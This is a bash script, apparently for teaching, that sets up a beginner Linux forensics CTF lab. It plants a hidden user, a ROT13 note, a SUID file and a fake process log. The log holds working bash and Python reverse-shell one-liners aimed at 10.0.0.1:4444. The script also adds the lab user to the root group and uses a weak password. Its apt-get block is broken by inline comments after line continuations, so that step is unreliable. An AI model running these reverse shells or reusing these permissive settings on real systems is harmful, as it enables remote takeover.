#!/usr/bin/env bash
# 
# AUTHOR      : Me and Claude
# LAB NAME    : The Spy's Backdoor
# LAB TYPE    : CTF — Linux Fundamentals (Permissions, Forensics, Cryptography)
# PLATFORM    : Ubuntu 22.04 LTS
# DIFFICULTY  : Beginner → Intermediate
# DESCRIPTION : Sets up a forensics-style CTF environment where the player acts
#               as an investigator uncovering a spy's backdoor on a Linux system.
#               Covers: hidden users, dotfile forensics, SUID exploitation,
#               reverse shell analysis, and ROT13 cryptography.
# 

set -euo pipefail   # Exit on error, unset variable, or pipe failure
IFS=$'\n\t'         # Safer word splitting

# =============================================================================
# FIXED VARIABLES — edit these to customise the lab environment
# =============================================================================

HOSTNAME="spy-lab"                          # VM hostname
LAB_ROOT="/tmp/spy_case"                    # Root directory for the challenge
LAB_USER="labuser"                          # Non-root user who runs the challenge
SPY_USERNAME="sp3y_4g3nt"                   # Backdoor account planted by the spy
SPY_UID=1337                                # Suspicious UID chosen by the spy
BACKDOOR_FILE="$LAB_ROOT/files/backdoor"   # SUID backdoor binary path
FLAG="CTF{y0u_f0und_th3_backd00r}"          # The hidden flag
ENCRYPTED_NOTE="Uryyb ntrag. Gur frperg zrrgvat vf ng zvqavtug. Cnffjbeq: PGS{l0h_s0haq_gu3_onpxq00e}"
SSH_PORT=22                                 # SSH port (change to e.g. 2222 to harden)
ALLOWED_SSH_CIDR="0.0.0.0/0"               # Restrict to a subnet in production, e.g. 192.168.1.0/24
LOG_FILE="/var/log/spy_lab_setup.log"       # Setup log

# Colour helpers
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

info()    { echo -e "${CYAN}[INFO]${NC}  $*" | tee -a "$LOG_FILE"; }
success() { echo -e "${GREEN}[OK]${NC}    $*" | tee -a "$LOG_FILE"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*" | tee -a "$LOG_FILE"; }
error()   { echo -e "${RED}[ERROR]${NC} $*" | tee -a "$LOG_FILE"; exit 1; }

# =============================================================================
# PREFLIGHT CHECKS
# =============================================================================

preflight() {
    info "Running preflight checks..."

    [[ $EUID -eq 0 ]] || error "This script must be run as root. Try: sudo bash $0"

    # Confirm Ubuntu 22.04
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        [[ "$ID" == "ubuntu" && "$VERSION_ID" == "22.04" ]] \
            || warn "Expected Ubuntu 22.04 — detected $PRETTY_NAME. Proceeding anyway."
    fi

    # Initialise log file
    mkdir -p "$(dirname "$LOG_FILE")"
    touch "$LOG_FILE"
    info "Logging to $LOG_FILE"

    success "Preflight checks passed."
}

# =============================================================================
# HOSTNAME
# =============================================================================

configure_hostname() {
    info "Setting hostname to '$HOSTNAME'..."
    hostnamectl set-hostname "$HOSTNAME"
    # Keep /etc/hosts consistent so sudo doesn't complain
    if ! grep -q "$HOSTNAME" /etc/hosts; then
        echo "127.0.1.1  $HOSTNAME" >> /etc/hosts
    fi
    success "Hostname set to '$HOSTNAME'."
}

# =============================================================================
# DEPENDENCIES
# =============================================================================

install_dependencies() {
    info "Updating package index..."
    apt-get update -qq

    info "Installing required packages..."
    apt-get install -y --no-install-recommends \
        python3 \          # Used to build the lab environment & in the process log
        python3-pip \      # Pip — useful for future lab extensions
        ufw \              # Uncomplicated Firewall
        openssh-server \   # SSH daemon
        curl \             # General utility
        net-tools \        # netstat — helpful for students inspecting the env
        procps \           # ps, top — process inspection tools
        coreutils \        # cat, find, ls, tr — core challenge tools
        tree               # Nice directory visualisation for hints

    success "Dependencies installed."
}

# =============================================================================
# LAB ENVIRONMENT SETUP
# =============================================================================

build_lab() {
    info "Building lab directory structure under $LAB_ROOT..."

    # --- Directory tree ---
    mkdir -p "$LAB_ROOT/logs"
    mkdir -p "$LAB_ROOT/.hidden"
    mkdir -p "$LAB_ROOT/system/proc"
    mkdir -p "$LAB_ROOT/files"

    # --- Task 1: Fake passwd backup containing the spy's hidden account ---
    info "Creating passwd backup (Task 1 — Hidden User)..."
    cat > "$LAB_ROOT/logs/passwd.bak" <<EOF
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
${SPY_USERNAME}:x:${SPY_UID}:${SPY_UID}::/home/${SPY_USERNAME}:/bin/bash
EOF

    # --- Task 2: ROT13-encrypted note hidden inside a hidden directory ---
    info "Creating hidden encrypted note (Task 2 — ROT13 Forensics)..."
    cat > "$LAB_ROOT/.hidden/.note" <<EOF
$ENCRYPTED_NOTE
EOF

    # --- Task 3: SUID backdoor binary ---
    info "Creating SUID backdoor file (Task 3 — SUID Permissions)..."
    echo "#!/bin/bash"                     >  "$BACKDOOR_FILE"
    echo "echo 'Access granted. Welcome.'" >> "$BACKDOOR_FILE"
    # Set ownership to root then apply SUID so it would run as root
    chown root:root "$BACKDOOR_FILE"
    chmod 4755 "$BACKDOOR_FILE"   # SUID (4) + rwxr-xr-x (755)

    # --- Task 4: Simulated process log showing a reverse shell ---
    info "Creating suspicious process log (Task 4 — Reverse Shell Analysis)..."
    cat > "$LAB_ROOT/system/proc/suspicious.log" <<EOF
PID   USER        COMMAND
1337  ${SPY_USERNAME}  /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
9999  root        python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
EOF

    # --- Permissions: make the lab world-readable so the lab user can explore ---
    chmod -R o+rX "$LAB_ROOT"
    # But keep the hidden note only owner-readable (extra challenge layer)
    chmod 600 "$LAB_ROOT/.hidden/.note"
    chown -R root:root "$LAB_ROOT"

    success "Lab environment built at $LAB_ROOT."
}

# =============================================================================
# CREATE LAB USER
# =============================================================================

create_lab_user() {
    info "Creating non-root lab user '$LAB_USER'..."

    if id "$LAB_USER" &>/dev/null; then
        warn "User '$LAB_USER' already exists — skipping creation."
    else
        useradd -m -s /bin/bash "$LAB_USER"
        # Set a simple password — change for production deployments
        echo "${LAB_USER}:labpassword" | chpasswd
        success "User '$LAB_USER' created with password 'labpassword'."
    fi

    # Give the lab user read access to the lab root
    usermod -aG root "$LAB_USER" 2>/dev/null || true  # Optional; remove if too permissive
}

# =============================================================================
# FIREWALL — UFW PORT RULES
# =============================================================================

configure_firewall() {
    info "Configuring UFW firewall..."

    # Reset to a known clean state
    ufw --force reset

    # Default policies
    ufw default deny incoming   # Block all unsolicited inbound traffic
    ufw default allow outgoing  # Allow all outbound (needed for apt, reverse shell simulation)

    # ----- ALLOWED PORTS -----

    # SSH — allow from the defined CIDR only
    info "Allowing SSH (port $SSH_PORT) from $ALLOWED_SSH_CIDR..."
    ufw allow from "$ALLOWED_SSH_CIDR" to any port "$SSH_PORT" proto tcp comment "SSH access"

    # HTTP/HTTPS — allow if you want to serve a web-based challenge scoreboard
    ufw allow 80/tcp  comment "HTTP  — challenge scoreboard (optional)"
    ufw allow 443/tcp comment "HTTPS — challenge scoreboard (optional)"

    # ----- BLOCKED PORTS -----

    # Block the reverse shell C2 port used in the challenge (4444) so students
    # cannot accidentally trigger a real outbound connection while experimenting
    ufw deny out 4444 comment "Block reverse shell C2 port used in challenge"

    # Block Telnet — insecure, should never be open on a lab VM
    ufw deny 23/tcp comment "Block Telnet"

    # Block common RPC/SMB ports — not needed, attack surface reduction
    ufw deny 135/tcp comment "Block MS-RPC"
    ufw deny 139/tcp comment "Block NetBIOS"
    ufw deny 445/tcp comment "Block SMB"

    # Enable and show status
    ufw --force enable
    ufw status verbose | tee -a "$LOG_FILE"

    success "Firewall configured."
}

# =============================================================================
# SSH HARDENING
# =============================================================================

configure_ssh() {
    info "Hardening SSH configuration..."

    local sshd_config="/etc/ssh/sshd_config"

    # Back up original config
    cp "$sshd_config" "${sshd_config}.bak.$(date +%F)"
    info "Original sshd_config backed up."

    # Apply hardened settings using sed (idempotent — replaces existing lines)
    declare -A ssh_settings=(
        ["Port"]="$SSH_PORT"                  # Use the port defined in fixed variables
        ["PermitRootLogin"]="no"              # Never allow direct root SSH login
        ["PasswordAuthentication"]="yes"      # Keep on for lab usability; set to 'no' + use keys in production
        ["PubkeyAuthentication"]="yes"        # Allow key-based auth
        ["PermitEmptyPasswords"]="no"         # Disallow blank passwords
        ["MaxAuthTries"]="3"                  # Lock out after 3 failed attempts
        ["LoginGraceTime"]="30"               # 30 seconds to complete login handshake
        ["X11Forwarding"]="no"               # Disable GUI forwarding — not needed
        ["AllowTcpForwarding"]="no"           # Prevent SSH tunnelling out of the lab
        ["ClientAliveInterval"]="300"         # Ping client every 5 min to detect dead sessions
        ["ClientAliveCountMax"]="2"           # Disconnect after 2 missed pings (10 min idle)
        ["Banner"]="/etc/ssh/banner"          # Show a login banner (created below)
        ["UseDNS"]="no"                       # Skip reverse DNS lookup — speeds up login
        ["LogLevel"]="VERBOSE"               # Log more detail for forensics/audit purposes
    )

    for key in "${!ssh_settings[@]}"; do
        value="${ssh_settings[$key]}"
        # If the directive already exists (commented or uncommented), replace it;
        # otherwise append it to the end of the file.
        if grep -qiE "^#?[[:space:]]*${key}[[:space:]]" "$sshd_config"; then
            sed -i "s|^#\?[[:space:]]*${key}[[:space:]].*|${key} ${value}|I" "$sshd_config"
        else
            echo "${key} ${value}" >> "$sshd_config"
        fi
    done

    # Restrict SSH access to the lab user only
    if ! grep -q "^AllowUsers" "$sshd_config"; then
        echo "AllowUsers $LAB_USER" >> "$sshd_config"
    else
        sed -i "s|^AllowUsers.*|AllowUsers $LAB_USER|" "$sshd_config"
    fi

    # Create login banner
    cat > /etc/ssh/banner <<'BANNER'
*******************************************************************************
           THE SPY'S BACKDOOR — CTF Lab Environment
           Authorised access only. All activity is logged.
           Hint: A spy was here. Can you find the evidence?
*******************************************************************************
BANNER

    # Validate config syntax before restarting
    sshd -t && success "sshd config syntax OK." || error "sshd config has errors — check $sshd_config"

    systemctl restart ssh
    systemctl enable ssh

    success "SSH hardened and restarted on port $SSH_PORT."
}

# =============================================================================
# SUMMARY
# =============================================================================

print_summary() {
    echo ""
    echo -e "${GREEN}============================================================${NC}"
    echo -e "${GREEN}  The Spy's Backdoor — Lab Setup Complete${NC}"
    echo -e "${GREEN}============================================================${NC}"
    echo -e "  Hostname     : $HOSTNAME"
    echo -e "  Lab root     : $LAB_ROOT"
    echo -e "  Lab user     : $LAB_USER  (password: labpassword)"
    echo -e "  SSH port     : $SSH_PORT"
    echo -e "  Flag         : $FLAG"
    echo ""
    echo -e "  Tasks planted:"
    echo -e "    Task 1 — Hidden user   : $LAB_ROOT/logs/passwd.bak"
    echo -e "    Task 2 — Encrypted note: $LAB_ROOT/.hidden/.note"
    echo -e "    Task 3 — SUID backdoor : $BACKDOOR_FILE"
    echo -e "    Task 4 — Process log   : $LAB_ROOT/system/proc/suspicious.log"
    echo ""
    echo -e "  Setup log    : $LOG_FILE"
    echo -e "${GREEN}============================================================${NC}"
    echo ""
    echo -e "  Connect with:  ssh ${LAB_USER}@<VM-IP> -p ${SSH_PORT}"
    echo ""
}

# =============================================================================
# MAIN — run sections in order
# =============================================================================

main() {
    preflight
    configure_hostname
    install_dependencies
    build_lab
    create_lab_user
    configure_firewall
    configure_ssh
    print_summary
    rm -- "$0" && info "Setup script removed."
}

main "$@"
